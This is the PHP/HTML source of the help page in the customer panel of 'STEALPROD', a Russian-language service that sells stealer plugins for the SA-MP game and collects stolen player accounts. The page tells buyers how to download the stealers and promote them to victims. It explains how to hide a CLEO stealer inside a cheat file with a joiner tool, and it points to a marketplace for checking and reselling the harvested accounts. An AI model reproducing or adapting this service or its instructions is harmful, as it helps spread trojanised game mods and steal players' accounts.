<?
session_start();
include './php/safemysql.php';
$db = new SafeMySQL();

if (!isset($_SESSION['login'])) echo '<script> window.location="login"; </script>';

if (isset($_SESSION['login'])) 
{
	$login = $_SESSION['login'];
	$sql = "SELECT * FROM `users` WHERE `login` = ?s";
	$userdata = $db->getRow($sql, $login);

	$nickname = $userdata['nickname'];
	$balance = $userdata['balance'];

	$asi = $userdata['asi'];
    $cs = $userdata['cs'];
    $sf = $userdata['sf'];
    $dll = $userdata['dll'];
    $lua = $userdata['lua'];

    $topserver = $userdata['topserv'];
    $topdialogs = $userdata['topdid'];
    $nonerepeat = $userdata['repeatoff'];

    $_SESSION['topserv'] = $topserver;
    $_SESSION['topdid'] = $topdialogs;
    $_SESSION['offrepeat'] = $nonerepeat;
    $_SESSION['balance'] = $balance;


    $_SESSION['asi'] = $asi;
    $_SESSION['cs'] = $cs;
    $_SESSION['dll'] = $dll;
    $_SESSION['lua'] = $lua;
    $_SESSION['sf'] = $sf;

    $id = $userdata['id'];
    $vkact = $userdata['vkkeys'];
    $logcount = $userdata['logs'];
    $_SESSION['logcount'] = $logcount;
    $size = $userdata['length'];

    if ($vkact == 'activated') {
    	$vkstatus = 'Привязан';
    }
    else {
    	$vkstatus = 'Не привязан';
    }

    $nowtime = date("d.m"); 
    $yerstadaytime = date("d.m", strtotime("-1 DAY"));
    $weeklogarray = array(
       0  => $nowtime,
       1  => $yerstadaytime,
       2  => date("d.m", strtotime("-2 DAY")),
       3  => date("d.m", strtotime("-3 DAY")),
       4  => date("d.m", strtotime("-4 DAY")),
       5  => date("d.m", strtotime("-5 DAY")),
       6  => date("d.m", strtotime("-6 DAY")),
       ); 





   if ($_GET['act'] == "logout")
   {
    unset($_SESSION['id']);
    unset($_SESSION['login']);
    unset($_SESSION['logcount']);
    unset($_SESSION['asi']);
    unset($_SESSION['cs']);
    unset($_SESSION['dll']);
    unset($_SESSION['lua']);
    unset($_SESSION['sf']);
    session_destroy();
    echo '<script> window.location="login"; </script>';
   }


}

?>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
    
	<meta name="description" content="STEALPROD - Проект по добыче аккаунтов самп">
	<meta name="keywords" content="crmp, samp, gta, sa, gta sa, multiplayer, malinovka, roleplay, rp, server, project, крмп, самп, гта, са, гта са, мультиплеер, стиллер, купить стиллер, личный кабинет стилпрод">
	<link rel="stylesheet" href="./jscss/font-awesome.min.css">
	<link rel="stylesheet" href="./jscss/animate.css">
	<link rel="stylesheet" href="./jscss/reset.css">
	<link rel="stylesheet" href="./jscss/style.css">
	<script type="text/javascript" async="" src="./jscss/analytics.js"></script><script async="" src="./jscss/js"></script>
	<script>
		window.dataLayer = window.dataLayer || [];
		function gtag(){dataLayer.push(arguments);}
		gtag('js', new Date());
		gtag('config', 'UA-115757944-2');
	</script>
</head>
<body onload="ajax_get_data(1)"><div class="loader"></div>
<div class="info-alert-mini">
	<div class="info-alert-mini-content">
		<div class="icon"></div>
		<h3></h3>
	</div>
</div>
<div class="info-alert">
	<div class="icon"></div>
	<h3></h3>
</div>
<div class="mobile-bar"></div>
<div class="mobile-menu">
	<div class="mobile-menu-content-wrapper">
		<div class="closer"></div>
		<div class="mobile-menu-content">
			<a href="/"><div class="logo"></div></a>
			<ul class="menu">
				<a href="/index"><li name="">Главная</li></a>
				<a target="_blank" href="/news"><li name="forum">Новости</li></a>
				<a href="/shop"><li name="start">Магазин</li></a>
				<a href="https://vk.com/stlprd"><li name="shop">Группа вконтакте</li></a>
				<a href="https://vk.com/stlprd" target="_blank"><li name="help">Беседа вконтакте</li></a>
								 
				<a href="/cp"><li name="profile" class="active"><? echo $nickname ?></li></a>
				<a href="?act=logout"><li name="exit">Выход</li></a>
							</ul>
		</div>
	</div>
</div>
<div class="header">
	<div class="header-content">
		<ul class="menu">
			<a href="/"><li name=""><img src="/img/logo/logo.png" style="zoom: 25%"></li></a>
			<a href="/cp"><li name="">Вернуться в личный кабинет</li></a>
			<a target="_blank" href="/help"><li class="link">Помощь</li></a>
			<a href="/shop"><li name="start">Магазин</li></a>
			<a href="https://vk.com/stlprd"><li name="shop">Группа вконтакте</li></a>
			<a href="" target="_blank"><li name="help">Беседа вконтакте</li></a>
		</ul>
			<div class="control two">
			<a name="profile" href="https://vk.com/stlprd">
				<div class="account">
					<div class="avatar" style="background-image:url(img/0.png)"></div>
					<h3><? echo $nickname ?></h3>
				</div>
			</a>
			<div class="settings closable">
				<div class="icon notClosable"></div>
				<div class="settings-wrapper thisContent animated">
					<div class="settings-content">
						<a><button name="password">Сменить пароль</button></a>
						<a><button name="nickname">Сменить ник</button></a>						
						<a><button name="vk">Привязать ВКонтакте</button></a>	
						<a><button name="notifications">Настройки логов</button></a>					
						<a><button name="balance">Пополнение баланса</button></a>						
						<!--<a><button name="buysteal">Докупка форматов</button></a>-->						
						<a href="/help"><button name="gides">Помощь</button></a>
												<a href="?act=logout"><button name="exit">Выход</button></a>
					</div>
				</div>
			</div>
		</div>
		</div>
</div>
	<title>Stealprod - Личный кабинет</title>
	<meta property="og:title" content="Личный кабинет - Stealprod"> 
	<meta property="og:image" content="">
	<link rel="stylesheet" href="./jscss/start.css">
	
		<div class="block start">
			<div class="particles"></div>
			<div class="content">
				<h2>КАК ПОЛЬЗОВАТЬСЯ СЕРВИСОМ STEALPROD?</h2>
				<h3>Проще простого</h3>
				<!--
				<div class="steps">
					<div class="step one">
						<h2>1</h2>
						<h3>ЗАГРУЗИТЕ ЛАУНЧЕР<br>НИЖЕ</h3>
					</div>
					<div class="step two">
						<h2>2</h2>
						<h3>ВВЕДИТЕ ДАННЫЕ<br>АККАУНТА</h3>
					</div>
					<div class="step three">
						<h2>3</h2>
						<h3>ПОДКЛЮЧИТЕСЬ К<br>СЕРВЕРУ</h3>
					</div>
				</div> -->
				<div class="req">
					<div class="require">
						<h2>ЧТО ТАКОЕ ПАНЕЛЬ УПРАВЛЕНИЯ (ПУ)?</h2>
						<h3>
							После покупки и активации ключа - вы попадаете в личный кабинет - это и есть ваша панель управления. В ней вы можете скачать ваши плагины. После пиара ваших плагинов, в вашу панель будут поступать логи (аккаунты). Также в вашей панели управления доступны функции - смены логина/пароля, привязки аккаунта Вконтакте, настройки логов (отключить повторы, ненужные диалоги или нубо-рп сервера) и другое, просто нажмите на шестеренку в верхнем правом углу.
						</h3>
					</div><br>
					<div class="require">
						<h2>КАК СКАЧАТЬ СТИЛЛЕРЫ (ПЛАГИНЫ)?</h2>
						<h3>
							Для того, чтобы скачать плагины, в личном кабинете найдите кнопку на ораньжевой панели - "Скачать плагины". 
						</h3>
					</div><br>
					<div class="require">
						<h2>КАК ПОЛУЧАТЬ ЛОГИ В ПАНЕЛЬ?</h2>
						<h3>
							Для того, чтобы получать логи (аккаунты) в вашу панель управления, необходимо пиарить ваши плагины. Ниже мы представили небольшой гайд со способами, как это можно сделать. 
						</h3>
					</div><br>
					<div class="require">
						<h2>КАК СКЛЕИТЬ CLEO СТИЛЛЕР?</h2>
						<h3>
							Для того, чтобы склеить ваш клео стиллер с любым клео читом, вам понадобиться специальный Connector by Mogaika. Скачать его можно по кнопке ниже. Далее все очень просто. Выделяем два клео файла и перетаскиваем на ярлык программы, после чего она запуститься и вы получите третий файл. 
						</h3>
					</div>
				</div>
				<a href="/download_files/connector.exe" target="_blank"><button><div class="icon"></div>Загрузить склейщик</button></a>
				<div class="req">
					<div class="require">
						<h2>КАК РАСШИФРОВЫВАЮТЯ ID ДИАЛОГОВ?</h2>
						<h3>
							Каждый номер диалога имеет своё значение. Мы собрали для вас значения часто встречающихся диалогов и поместили в файл txt.

						</h3>
					</div></div>
					<a href="/download_files/id.txt" target="_blank"><button><div class="icon"></div>Скачать расшифровки ID диалогов</button></a>
					<div class="req">
					<div class="require">
						<h2>КАК СКАЧАТЬ СТИЛЛЕРЫ (ПЛАГИНЫ)?</h2>
						<h3>
							Для того, чтобы скачать плагины, в личном кабинете найдите кнопку на ораньжевой панели - "Скачать плагины". 
						</h3>
					</div><br>
					<div class="require">
						<h2>КАК ПРОПИАРИТЬ СВОЮ ПАНЕЛЬ?</h2>
						<h3>
							На сегодняшний день - пиар панели управления не составляет как таковой сложности. Вы можете воспользоваться услугой пиарщиков, например - <a href="https://vk.com/iwuds">Роман Фермин</a> , или же попробовать самому. Мы предоставляем вам некоторый гайд, который вы можете скачать, <a href="/download_files/pr.txt" target="_blank">перейдя по этой ссылке.</a> 
						</h3>
					</div>
				</div>
				<a href="/download_files/pr.txt" target="_blank"><button><div class="icon"></div>Скачать гайд по пиару</button></a>
				<div class="req">
					<div class="require">
						<h2>КАК ПОЛУЧИТЬ БЕСПЛАТНЫЙ ЧЕКЕР ЛОГОВ И ПРОДАВАТЬ АККАУНТЫ?</h2>
						<h3>
							Вы также можете получить бесплатный чекер логов от нашего партнера - торговой площадки <a href="http://samp-store.ru">SAMP-STORE</a>, для этого вам необходимо пройти регистрацию, а далее в боком меню найти пункт - Чекер логов. Также на ней, вы можете легко и быстро реализовывать ваши аккаунты, выводя деньги на удобный вам кошелек. 
						</h3>
					</div>
				</div>
			</div>
			<div class="footer">
	<div class="links">
		<a href="https://vk.com/malinovka" target="_blank"><div class="icon vk"></div></a>
		<a href="https://malinovka.org/help"><div class="icon help"></div></a>
		<a href="mailto:ceo@malinovka.org"><div class="icon mail"></div></a>
		<!-- <a href='https://status.malinovka.org' target='_blank'><div class='icon status'></div></a> -->
	</div>
	<h4>ceo@malinovka.org</h4>
	<h3>Malinovka Team © 2017-2020</h3>
	<div class="age"></div>
</div>
		</div>
	
	<script src="./jscss/jquery-3.2.1.min.js" type="text/javascript"></script>
<script src="./jscss/date.format.js" type="text/javascript"></script>
<script src="./jscss/wow.min.js" type="text/javascript"></script>
<script src="./jscss/common.js" type="text/javascript"></script>
<script src="./jscss/classie.js" type="text/javascript"></script>
<script src="./jscss/main.js" type="text/javascript"></script>
<script type="text/javascript" src="./jscss/start.js"></script>
</body></html>